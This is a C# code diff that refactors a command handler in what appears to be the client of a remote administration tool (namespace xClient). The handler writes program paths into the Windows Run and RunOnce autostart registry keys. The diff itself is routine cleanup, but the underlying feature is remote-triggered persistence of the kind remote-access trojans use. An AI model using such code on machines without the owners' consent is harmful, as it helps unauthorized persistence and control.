@@ -154,10 +154,7 @@ namespace xClient.Core.Commands
                 switch (command.Type)
                 {
                     case 0:
-                        using (
-                            var key =
-                                Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-                                    true))
+                        using (var key = Registry.LocalMachine.OpenWritableSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                         {
                             if (key == null) throw new Exception("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
@@ -167,10 +164,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 1:
-                        using (
-                            var key =
-                                Registry.LocalMachine.OpenSubKey(
-                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
+                        using (var key = Registry.LocalMachine.OpenWritableSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                         {
                             if (key == null) throw new Exception("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
@@ -180,10 +174,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 2:
-                        using (
-                            var key =
-                                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-                                    true))
+                        using (var key = Registry.CurrentUser.OpenWritableSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                         {
                             if (key == null) throw new Exception("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
@@ -193,10 +184,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 3:
-                        using (
-                            var key =
-                                Registry.CurrentUser.OpenSubKey(
-                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
+                        using (var key = Registry.CurrentUser.OpenWritableSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                         {
                             if (key == null) throw new Exception("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
@@ -209,10 +197,7 @@ namespace xClient.Core.Commands
                         if (OSInfo.Bits != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
-                        using (
-                            var key =
-                                Registry.LocalMachine.OpenSubKey(
-                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                        using (var key = Registry.LocalMachine.OpenWritableSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                         {
                             if (key == null) throw new Exception("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
@@ -225,10 +210,7 @@ namespace xClient.Core.Commands
                         if (OSInfo.Bits != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
-                        using (
-                            var key =
-                                Registry.LocalMachine.OpenSubKey(
-                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
+                        using (var key = Registry.LocalMachine.OpenWritableSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                         {
                             if (key == null) throw new Exception("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
